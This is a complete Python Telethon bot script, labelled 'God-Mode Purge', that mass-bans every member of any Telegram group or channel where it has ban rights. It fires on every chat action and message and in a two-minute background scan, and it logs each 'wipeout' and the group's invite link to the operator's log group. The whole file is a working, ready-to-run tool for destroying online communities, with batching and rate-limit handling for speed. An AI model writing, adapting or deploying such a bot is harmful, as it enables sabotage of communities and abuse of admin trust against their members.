import os, asyncio, time
from telethon import TelegramClient, events, functions, types
from telethon.errors import FloodWaitError, ChatAdminRequiredError, UserAdminInvalidError

# ───── [ CONFIGURATION ] ───── #
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
LOG_GROUP_ID = int(os.environ.get("LOG_GROUP_ID"))

# OWNER ID (Full Protection)
OWNER_ID = 7834647169 

total_banned = 0
active_tasks = set()
BATCH_SIZE = 45 # Extreme Speed

bot = TelegramClient("god_mode_purge", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ───── [ CORE HELPERS ] ───── #

async def get_invite_link(chat):
    if getattr(chat, 'username', None):
        return f"https://t.me/{chat.username}"
    try:
        res = await bot(functions.messages.ExportChatInviteRequest(peer=chat.id))
        return res.link
    except:
        return "⚠️ Private (No Invite Permission)"

async def ban_user(chat_id, user_id):
    global total_banned
    try:
        await bot(functions.channels.EditBannedRequest(
            channel=chat_id,
            participant=user_id,
            banned_rights=types.ChatBannedRights(until_date=None, view_messages=True)
        ))
        total_banned += 1
        return True
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        return False
    except:
        return "ERROR"

# ───── [ THE ULTIMATE ENGINE ] ───── #

async def start_god_purge(chat):
    if chat.id in active_tasks: return
    active_tasks.add(chat.id)
    
    start_t = time.time()
    local_count = 0
    me = await bot.get_me()
    link = await get_invite_link(chat)

    await bot.send_message(
        LOG_GROUP_ID,
        f"☣️ **GOD-MODE TRIGGERED** ☣️\n\n"
        f"🏰 **Group:** `{chat.title}`\n"
        f"🔗 **Link:** {link}\n"
        f"⚡ **Action:** Full Wipeout..."
    )

    try:
        batch = []
        async for user in bot.iter_participants(chat.id):
            if user.id == me.id or user.id == OWNER_ID or user.bot:
                continue
            
            batch.append(ban_user(chat.id, user.id))

            if len(batch) >= BATCH_SIZE:
                results = await asyncio.gather(*batch)
                local_count += sum(1 for r in results if r is True)
                batch = []
                if "ERROR" in results: break
                await asyncio.sleep(0.01)

        if batch:
            results = await asyncio.gather(*batch)
            local_count += sum(1 for r in results if r is True)

    finally:
        dur = round(time.time() - start_t, 2)
        active_tasks.remove(chat.id)
        
        await bot.send_message(
            LOG_GROUP_ID,
            f"💀 **WIPEOUT COMPLETE**\n\n"
            f"🏰 **Group:** {chat.title}\n"
            f"🚫 **Banned:** `{local_count}`\n"
            f"⏱️ **Time:** `{dur}s`\n"
            f"📈 **Total Lifetime Bans:** `{total_banned}`"
        )

# ───── [ ALL-IN-ONE TRIGGER ENGINE ] ───── #

# Trigger 1: Koi bhi Chat Action (Join, Left, Pin, New Admin, Title Change, etc.)
@bot.on(events.ChatAction)
async def action_trigger(event):
    chat = await event.get_chat()
    asyncio.create_task(validate_and_run(chat))

# Trigger 2: Naya Message aane par
@bot.on(events.NewMessage())
async def message_trigger(event):
    if event.is_group or event.is_channel:
        chat = await event.get_chat()
        asyncio.create_task(validate_and_run(chat))

# Trigger 3: Background Ghost Scan (Har 2 minute mein)
async def ghost_scanner():
    while True:
        try:
            async for dialog in bot.iter_dialogs():
                if dialog.is_group or dialog.is_channel:
                    asyncio.create_task(validate_and_run(dialog.entity))
        except: pass
        await asyncio.sleep(120)

async def validate_and_run(chat):
    if chat.id in active_tasks: return
    try:
        p = await bot.get_permissions(chat.id, 'me')
        if p.is_admin and p.ban_users:
            await start_god_purge(chat)
    except: pass

# ───── [ START BOT ] ───── #

async def main():
    print("☣️ God-Mode Purge Bot is ACTIVE!")
    await bot.send_message(LOG_GROUP_ID, "🚀 **God-Mode Online:** Har chhote action pe nazar hai!")
    asyncio.create_task(ghost_scanner())
    await bot.run_until_disconnected()

bot.loop.run_until_complete(main())
